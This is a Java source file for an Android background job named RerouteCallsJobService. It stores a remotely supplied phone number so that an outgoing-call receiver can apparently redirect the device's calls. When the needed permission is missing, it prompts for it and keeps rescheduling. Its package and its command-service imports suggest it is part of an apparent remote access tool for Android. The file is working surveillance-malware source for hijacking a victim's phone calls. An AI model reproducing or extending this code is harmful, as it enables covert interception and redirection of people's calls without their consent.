package com.candroid.lofl.services.jobs;

import android.Manifest;
import android.app.job.JobInfo;
import android.app.job.JobParameters;
import android.app.job.JobScheduler;
import android.app.job.JobService;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.PersistableBundle;
import android.preference.PreferenceManager;

import com.candroid.lofl.activities.permissions.CallLogActivity;
import com.candroid.lofl.activities.permissions.PhoneActivity;
import com.candroid.lofl.api.Systems;
import com.candroid.lofl.data.Constants;
import com.candroid.lofl.receivers.OutgoingCallReceiver;
import com.candroid.lofl.services.CommandsIntentService;

public class RerouteCallsJobService extends JobService {
    public static final String TAG = RerouteCallsJobService.class.getSimpleName();
    public static final int ID = 69;
    public static final String KEY_NUMBER = "KEY_NUMBER";
    @Override
    public boolean onStartJob(JobParameters params) {
        if(checkSelfPermission(Manifest.permission.PROCESS_OUTGOING_CALLS) == PackageManager.PERMISSION_GRANTED){
            String number = params.getExtras().getString(KEY_NUMBER);
            SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(this).edit();
            editor.putString(OutgoingCallReceiver.NUMBER_KEY, number);
            editor.apply();
            jobFinished(params, false);
        }else{
            CommandsIntentService.startPermissionActivity(this, new Intent(), CallLogActivity.class);
            jobFinished(params, true);
        }
        return true;
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        return true;
    }

    public static void schedule(Context context, String number){
        JobScheduler jobScheduler = (JobScheduler) context.getSystemService(Context.JOB_SCHEDULER_SERVICE);
        JobInfo.Builder builder = new JobInfo.Builder(ID, new ComponentName(context, RerouteCallsJobService.class));
        builder.setPersisted(true);
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.P){
            builder.setImportantWhileForeground(true);
        }
        builder.setMinimumLatency(Constants.TEN_SECONDS);
        builder.setOverrideDeadline(Constants.TWENTY_SECONDS);
        PersistableBundle bundle = new PersistableBundle();
        bundle.putString(KEY_NUMBER, number);
        builder.setExtras(bundle);
        jobScheduler.schedule(builder.build());
    }
}
